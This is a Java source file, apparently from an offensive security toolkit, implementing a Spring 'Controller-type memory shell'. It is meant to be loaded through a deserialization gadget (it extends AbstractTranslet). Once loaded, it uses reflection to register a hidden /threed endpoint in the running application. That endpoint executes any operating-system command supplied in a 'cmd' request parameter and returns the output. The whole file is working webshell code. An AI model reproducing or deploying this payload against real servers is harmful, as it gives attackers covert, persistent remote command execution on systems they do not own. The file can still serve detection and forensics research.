package com.threed.shell.spring;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Scanner;

/**
 * @className: ControllerInject
 * @description: Controller型内存马
 * @author: two_day
 * @date: 2022/5/28
 **/
public class SpringControllerInject extends AbstractTranslet {

    static {
        try{
            String controllerPath = "/threed";
            //1. 获取当前应用的上下文
            HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(request);
            //2. 从context中获得RequestMappingHandlerMapping的实例
                RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            //判断url是否存在
            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);
            Class<?> aClass = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            //判断当前路径是否已添加
            Field field = aClass.getDeclaredField("urlLookup");
            field.setAccessible(true);
            Map<String, Object> urlLookup= (Map<String, Object>)field.get(mappingRegistry);
            if (!urlLookup.containsKey(controllerPath)){
                //3. 通过反射获取自定义controller中的method对象
                Method threed = SpringControllerInject.class.getMethod("threed");
                //4. 定义访问controller的url地址
                PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
                //5. 定义允许访问controller的http方法
                RequestMethodsRequestCondition rmrc = new RequestMethodsRequestCondition();

                //6. 在内存中注册controller
                RequestMappingInfo requestMappingInfo = new RequestMappingInfo(url, rmrc, null, null, null, null, null);
                SpringControllerInject inject = new SpringControllerInject();
                mappingHandlerMapping.registerMapping(requestMappingInfo, inject, threed);
                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
                assert response != null;
                response.getWriter().write("controller inject success");
            }else{
                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
                assert response != null;
                response.getWriter().write("controller exists already");
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public void threed() throws IOException {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        String cmd = request.getParameter("cmd");
        if (cmd != null && response != null){
            Process process = Runtime.getRuntime().exec(cmd);
            Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
            String output = s.hasNext() ? s.next() : "";
            PrintWriter writer = response.getWriter();
            writer.write(output);
            writer.flush();
            writer.close();
        }
    }
}
